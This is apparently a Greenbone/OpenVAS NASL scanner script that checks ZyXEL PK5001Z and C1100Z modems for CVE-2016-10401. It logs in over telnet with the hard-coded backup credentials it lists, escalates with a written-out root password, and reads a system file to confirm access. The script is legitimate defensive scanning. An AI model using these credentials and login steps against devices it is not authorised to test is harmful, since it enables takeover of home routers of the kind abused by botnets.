if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.112100" );
	script_version( "2021-09-14T14:01:45+0000" );
	script_cve_id( "CVE-2016-10401" );
	script_tag( name: "cvss_base", value: "9.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:C/I:C/A:C" );
	script_name( "ZyXEL Modems Backup Telnet Account and Default Root Credentials" );
	script_tag( name: "last_modification", value: "2021-09-14 14:01:45 +0000 (Tue, 14 Sep 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-11-03 01:29:00 +0000 (Fri, 03 Nov 2017)" );
	script_tag( name: "creation_date", value: "2017-11-02 09:19:00 +0200 (Thu, 02 Nov 2017)" );
	script_category( ACT_ATTACK );
	script_family( "Default Accounts" );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_dependencies( "telnetserver_detect_type_nd_version.sc", "gb_default_credentials_options.sc" );
	script_require_ports( "Services/telnet", 23 );
	script_mandatory_keys( "telnet/zyxel/modem/detected" );
	script_exclude_keys( "default_credentials/disable_default_account_checks" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/43105/" );
	script_xref( name: "URL", value: "https://forum.openwrt.org/viewtopic.php?id=62266" );
	script_xref( name: "URL", value: "https://thehackernews.com/2017/11/mirai-botnet-zyxel.html" );
	script_xref( name: "URL", value: "https://www.reddit.com/r/centurylink/comments/5lt07r/zyxel_c1100z_default_lanside_telnet_login/" );
	script_tag( name: "summary", value: "ZyXEL PK5001Z and C1100Z modems have default root credentials set and a backdoor account with hard-coded credentials." );
	script_tag( name: "impact", value: "This issue may be exploited by a remote attacker to gain full
  access to sensitive information or modify system configuration." );
	script_tag( name: "vuldetect", value: "Connect to the telnet service and try to login with default credentials." );
	script_tag( name: "solution", value: "It is recommended to disable the telnet access and change the backup and default credentials." );
	script_tag( name: "insight", value: "In February 2018 it was discovered that this vulnerability is being exploited by the
  'DoubleDoor' Internet of Things (IoT) Botnet." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "Mitigation" );
	exit( 0 );
}
if(get_kb_item( "default_credentials/disable_default_account_checks" )){
	exit( 0 );
}
require("telnet_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("dump.inc.sc");
port = telnet_get_port( default: 23 );
banner = telnet_get_banner( port: port );
if(!banner){
	exit( 0 );
}
if(ContainsString( banner, "PK5001Z login:" ) || ContainsString( banner, "BCM963268 Broadband Router" )){
	found = TRUE;
}
if(found){
	login = "admin";
	passwords = make_list( "CenturyL1nk",
		 "CentryL1nk",
		 "QwestM0dem" );
	root_pass = "zyad5001";
	report = "The following issues have been found:\n";
	for pass in passwords {
		soc = open_sock_tcp( port );
		if(!soc){
			continue;
		}
		recv = recv( socket: soc, length: 2048 );
		if(ContainsString( recv, "PK5001Z login:" ) || ContainsString( recv, "Login:" )){
			send( socket: soc, data: tolower( login ) + "\r\n" );
			recv = recv( socket: soc, length: 128 );
			if(ContainsString( recv, "Password:" )){
				send( socket: soc, data: pass + "\r\n\r\n" );
				recv = recv( socket: soc, length: 1024 );
				send( socket: soc, data: "whoami\r\n" );
				recv = recv( socket: soc, length: 1024 );
				if(IsMatchRegexp( recv, "admin" )){
					VULN = TRUE;
					report += "\n\nIt was possible to login via telnet using the following backup credentials:\n";
					report += "Login: " + login + ", Password: " + pass;
				}
				send( socket: soc, data: "su\r\n" );
				recv = recv( socket: soc, length: 1024 );
				send( socket: soc, data: root_pass + "\r\n" );
				recv = recv( socket: soc, length: 1024 );
				send( socket: soc, data: "cat /etc/zyfwinfo\r\n" );
				recv = recv( socket: soc, length: 1024 );
				if(IsMatchRegexp( recv, "ZyXEL Communications Corp." )){
					VULN = TRUE;
					report += "\n\nIt was possible to escalate to root privileges with the following root password: " + root_pass;
				}
			}
		}
		close( soc );
	}
	if( VULN ){
		security_message( port: port, data: report );
		exit( 0 );
	}
	else {
		exit( 99 );
	}
}
exit( 0 );

